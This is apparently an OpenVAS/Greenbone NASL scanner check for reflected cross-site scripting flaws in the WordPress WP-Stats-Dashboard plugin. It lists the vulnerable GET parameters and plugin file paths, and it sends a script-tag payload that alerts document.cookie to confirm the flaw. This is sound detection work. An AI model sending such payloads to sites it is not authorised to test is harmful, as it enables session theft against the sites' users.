CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902713" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-08-23 07:05:00 +0200 (Tue, 23 Aug 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "WordPress WP-Stats-Dashboard Plugin Multiple Cross-Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2011/Aug/128" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/519348" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/multiple_xss_in_wp_stats_dashboard.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress WP-Stats-Dashboard version 2.6.6.1 and prior." );
	script_tag( name: "insight", value: "The flaws are due to input passed via,

  - 'icon', 'url', 'name', 'type', 'code', 'username' GET parameters to
  '/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php'

  - 'onchange' GET parameter to
  '/wp-content/plugins/wp-stats-dashboard/view/admin/blocks/select-trend.php'

  - and 'submenu' GET parameter to
  '/wp-content/plugins/wp-stats-dashboard/view/admin/blocks/submenu.php'
  is not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with WordPress WP-Stats-Dashboard Plugin
  and is prone to multiple cross-site scripting vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/wp-stats-dashboard/view/admin/blocks/select-trend.php?onchange=><script>alert(document.cookie);</script>";
if(http_vuln_check( port: port, url: url, pattern: "><script>alert\\(document\\.cookie\\);</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

